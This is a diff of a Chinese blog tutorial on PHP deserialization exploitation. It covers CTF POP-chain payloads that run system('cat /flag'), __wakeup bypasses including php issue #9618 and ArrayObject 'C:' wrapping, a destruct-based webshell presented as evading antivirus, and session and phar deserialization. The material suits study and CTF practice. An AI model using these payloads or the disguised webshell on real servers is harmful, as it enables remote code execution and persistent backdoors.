 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">pop</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">5</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;sorry&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;name&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">8</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;password&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">3</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;key&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;hint&#34;</span>;<span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;show&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">1</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">3</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;ctf&#34;</span>;<span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">11</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;secret_code&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">1</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;code&#34;</span>;<span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">5</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;sorry&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;name&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">8</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;password&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">3</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;key&#34;</span>;<span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;fine&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">2</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">3</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;cmd&#34;</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">6</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;system&#34;</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">7</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;content&#34;</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">9</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;cat /flag&#34;</span>;}<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;hint&#34;</span>;<span style="color:#58a1dd">r</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">10</span>;}}}</span></span></code></pre></div><p>或者在r;10;后面加一个1：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">pop</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">5</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;sorry&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;name&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">8</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;password&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">3</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;key&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;hint&#34;</span>;<span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;show&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">1</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">3</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;ctf&#34;</span>;<span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">11</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;secret_code&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">1</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;code&#34;</span>;<span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">5</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;sorry&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;name&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">8</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;password&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">3</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;key&#34;</span>;<span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;fine&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">2</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">3</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;cmd&#34;</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">6</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;system&#34;</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">7</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;content&#34;</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">9</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;cat /flag&#34;</span>;}<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;hint&#34;</span>;<span style="color:#58a1dd">r</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">10</span>;<span style="color:#a6be9d">1</span>}}}}</span></span></code></pre></div><p>都可以实现wakeup绕过</p>
-<h6 id="php-issue9618" class="heading-element"><span>0.0.0.6.5  php issue#9618</span>
+<h2 id="php-issue9618" class="heading-element"><span>php issue#9618</span>
   <a href="#php-issue9618" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p><a href="https://github.com/php/php-src/issues/9618"target="_blank" rel="external nofollow noopener noreferrer">php issue#9618</a>提到了最新版wakeup()的一种bug，可以通过在反序列化后的字符串中包含字符串长度错误的变量名使反序列化在==__wakeup之前调用__destruct()函数==版本：</p>
+</h2><p><a href="https://github.com/php/php-src/issues/9618"target="_blank" rel="external nofollow noopener noreferrer">php issue#9618</a>提到了最新版wakeup()的一种bug，可以通过在反序列化后的字符串中包含字符串长度错误的变量名使反序列化在==__wakeup之前调用__destruct()函数==版本：</p>
 <ul>
 <li>7.4.x -7.4.30</li>
 <li>8.0.x</li>
@@ -577,7 +605,7 @@ class B
 $test=new A();
 $test-&gt;info=new B();
 echo serialize($test);
-#####O:1:&#34;A&#34;:2:{s:4:&#34;info&#34;;O:1:&#34;B&#34;:1:{s:3:&#34;znd&#34;;N;}s:6:&#34;Aend&#34;;s:1:&#34;1&#34;;}</code></pre><p><img loading="lazy" src="https://fushuling.com/wp-content/uploads/2023/03/1-22.jpg" alt="img" srcset="https://fushuling.com/wp-content/uploads/2023/03/1-22.jpg?size=small, https://fushuling.com/wp-content/uploads/2023/03/1-22.jpg?size=medium 1.5x, https://fushuling.com/wp-content/uploads/2023/03/1-22.jpg?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+#O:1:&#34;A&#34;:2:{s:4:&#34;info&#34;;O:1:&#34;B&#34;:1:{s:3:&#34;znd&#34;;N;}s:6:&#34;Aend&#34;;s:1:&#34;1&#34;;}</code></pre><p><img loading="lazy" src="https://fushuling.com/wp-content/uploads/2023/03/1-22.jpg" alt="img" srcset="https://fushuling.com/wp-content/uploads/2023/03/1-22.jpg?size=small, https://fushuling.com/wp-content/uploads/2023/03/1-22.jpg?size=medium 1.5x, https://fushuling.com/wp-content/uploads/2023/03/1-22.jpg?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>成功绕过wakeup</p>
 <p>**原理：**声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上<code>\0*\0</code>的前缀。这里的\0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。也就是说当实例化的类里存在私有属性时比如private时，序列化它时会出现字符长度那里会出现不可见字符，比如：</p>
 <p><img loading="lazy" src="https://fushuling.com/wp-content/uploads/2023/04/1-1-1024x360.png" alt="img" srcset="https://fushuling.com/wp-content/uploads/2023/04/1-1-1024x360.png?size=small, https://fushuling.com/wp-content/uploads/2023/04/1-1-1024x360.png?size=medium 1.5x, https://fushuling.com/wp-content/uploads/2023/04/1-1-1024x360.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
@@ -590,11 +618,11 @@ echo serialize($test);
 <p>你这时不难想到如果给最初destruct和wakeup不同类的payload加上%00会怎么样呢，答案是这种情况下就会正常反序列化，不能绕过wakeup了</p>
 <p><img loading="lazy" src="https://fushuling.com/wp-content/uploads/2023/04/1-5-1024x792.png" alt="img" srcset="https://fushuling.com/wp-content/uploads/2023/04/1-5-1024x792.png?size=small, https://fushuling.com/wp-content/uploads/2023/04/1-5-1024x792.png?size=medium 1.5x, https://fushuling.com/wp-content/uploads/2023/04/1-5-1024x792.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>感觉还是和fast-destruct以及php的GC回收的算法有关，不想研究了，摆了</p>
-<h6 id="使用c绕过" class="heading-element"><span>0.0.0.6.6  使用C绕过</span>
+<h2 id="使用c绕过" class="heading-element"><span>使用C绕过</span>
   <a href="#%e4%bd%bf%e7%94%a8c%e7%bb%95%e8%bf%87" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>php7.3.4</p>
+</h2><p>php7.3.4</p>
 <p>挺早之前我就知道使用C代替O能绕过wakeup，但那样的话只能执行construct()函数或者destruct()函数，无法添加任何内容，这次比赛学到了种新方法，就是把正常的反序列化进行一次打包，让最后生成的payload以C开头即可</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">error_reporting</span>(<span style="color:#a6be9d">0</span>);
@@ -634,7 +662,7 @@ echo serialize($test);
 </span></span><span style="display:flex;"><span>} 
 </span></span><span style="display:flex;"><span>$a=new ctfshow();
 </span></span><span style="display:flex;"><span>echo serialize($a);
-</span></span><span style="display:flex;"><span>#####O:7:&#34;ctfshow&#34;:0:{}
+</span></span><span style="display:flex;"><span>#O:7:&#34;ctfshow&#34;:0:{}
 </span></span></code></pre></div><p>我们把O改成C传入C:7:”ctfshow”:0:{}可以看到网页显示bypass</p>
 <p><img loading="lazy" src="https://fushuling.com/wp-content/uploads/2023/04/1-6.png" alt="img" srcset="https://fushuling.com/wp-content/uploads/2023/04/1-6.png?size=small, https://fushuling.com/wp-content/uploads/2023/04/1-6.png?size=medium 1.5x, https://fushuling.com/wp-content/uploads/2023/04/1-6.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>但你只能这么传入，稍微改一点就没反应了，更别说向里面传值了，这里我们可以使用ArrayObject对正常的反序列化进行一次包装，让最后输出的payload以C开头(官方文档说：This class allows objects to work as arrays.)</p>
@@ -662,7 +690,7 @@ echo serialize($test);
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">$res</span>;
 </span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//unserialize($res)
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#828b96;font-style:italic">?&gt;</span>
-</span></span><span style="display:flex;"><span>#####C:11:&#34;ArrayObject&#34;:77:{x:i:0;a:1:{s:4:&#34;evil&#34;;O:7:&#34;ctfshow&#34;:1:{s:7:&#34;ctfshow&#34;;s:6:&#34;whoami&#34;;}};m:a:0:{}}
+</span></span><span style="display:flex;"><span>#C:11:&#34;ArrayObject&#34;:77:{x:i:0;a:1:{s:4:&#34;evil&#34;;O:7:&#34;ctfshow&#34;:1:{s:7:&#34;ctfshow&#34;;s:6:&#34;whoami&#34;;}};m:a:0:{}}
 </span></span></code></pre></div><p>最后成功命令执行</p>
 <p><img loading="lazy" src="https://fushuling.com/wp-content/uploads/2023/04/1-7-1024x565.png" alt="img" srcset="https://fushuling.com/wp-content/uploads/2023/04/1-7-1024x565.png?size=small, https://fushuling.com/wp-content/uploads/2023/04/1-7-1024x565.png?size=medium 1.5x, https://fushuling.com/wp-content/uploads/2023/04/1-7-1024x565.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>但我本地尝试的时候发现这种包装方法对php版本有要求，我用7.3.4才可以输出以C开头的payload，换7.4或者8.0输出的就是O开头了，除了这个函数还有其他方法可以对payload进行包装，具体可以参考[愚人杯3rd <a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#"target="_blank" rel="external nofollow noopener noreferrer">easy_php]</a>：</p>
@@ -675,11 +703,11 @@ echo serialize($test);
 <li>SplObjectStorage::unserialize</li>
 </ul>
 </blockquote>
-<h5 id="destruct免杀" class="heading-element"><span>0.0.0.7  destruct免杀</span>
+<h1 id="destruct免杀" class="heading-element"><span>destruct免杀</span>
   <a href="#destruct%e5%85%8d%e6%9d%80" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>以下代码就相当于<code>&lt;?php @eval($_POST['test']);?&gt;</code></p>
+</h1><p>以下代码就相当于<code>&lt;?php @eval($_POST['test']);?&gt;</code></p>
 <p>此木马毕竟是跟正常文件太像，所以免杀效果很不错。</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> 
 </span></span><span style="display:flex;"><span>    <span style="color:#ff636f">class</span> <span style="color:#58a1dd">A</span>{ 
@@ -693,11 +721,11 @@ echo serialize($test);
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">$pp</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;O:1:</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">A</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">:1:{s:4:</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">test</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">;s:&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$len</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#34;:</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">&#34;</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">$test</span><span style="color:#ff636f">.</span><span style="color:#a6be9d">&#34;;</span><span style="color:#a6be9d">\&#34;</span><span style="color:#a6be9d">;}&#34;</span>; <span style="color:#828b96;font-style:italic">// 构造序列化对象，用我们POST传过去的命令代码字符串覆盖$test=&#34;demo&#34;，从而执行恶意命令。 
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">$test_unser</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">unserialize</span>(<span style="color:#58a1dd">$pp</span>); <span style="color:#828b96;font-style:italic">// 反序列化同时触发_destruct函数 
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#828b96;font-style:italic">?&gt;</span>
-</span></span></code></pre></div><h5 id="session反序列化" class="heading-element"><span>0.0.0.8  session反序列化</span>
+</span></span></code></pre></div><h1 id="session反序列化" class="heading-element"><span>session反序列化</span>
   <a href="#session%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><blockquote>
+</h1><blockquote>
 <p>选择不同的处理器，处理方式也不一样，如果序列化和储存session与反序列化的方式不同，就有可能导致漏洞的产生。</p>
 <p><a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/80vul/phpcodz/blob/master/research/pch-013.md</a></p>
 <p>我之前一直不理解session是怎么影响到当前php脚本的，现在懂了一些，==当 PHP 停止的时候，它会自动读取 内存中<code>$_SESSION</code> 中的内容，并将其进行<code>序列化</code>， 然后发送给会话保存管理器来进行保存（持久化存储在硬盘上）。==也就是session被序列化的时候，那我猜session进行反序列化的时候就是用户传过来sessid并且确实存在这个会话id的时候，这个时候硬盘中的sess_文件内容会被反序列化取出到内存中，那么这里也能看出来==用户越多的时候对服务器的内存压力是越大的==。</p>
@@ -798,27 +826,27 @@ echo serialize($test);
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#58a1dd">body</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#58a1dd">html</span>&gt;</span></span></code></pre></div><p>抓包修改，在序列化的字符串前加 |，提交即可。</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161719411.png" alt="image-20230316171920324" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161719411.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161719411.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303161719411.png?size=large 2x" data-title="image-20230316171920324" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h5 id="phar反序列化" class="heading-element"><span>0.0.0.9  phar反序列化</span>
+<h1 id="phar反序列化" class="heading-element"><span>phar反序列化</span>
   <a href="#phar%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>phar反序列化即在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。</p>
+</h1><p>phar反序列化即在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作。</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242310541.webp" alt="image-20230524231049353" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242310541.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242310541.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242310541.webp?size=large 2x" data-title="image-20230524231049353" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p><a href="https://paper.seebug.org/680/"target="_blank" rel="external nofollow noopener noreferrer">https://paper.seebug.org/680/</a></p>
-<h6 id="漏洞利用条件" class="heading-element"><span>0.0.0.9.1  漏洞利用条件</span>
+<h2 id="漏洞利用条件" class="heading-element"><span>漏洞利用条件</span>
   <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%9d%a1%e4%bb%b6" class="heading-mark">
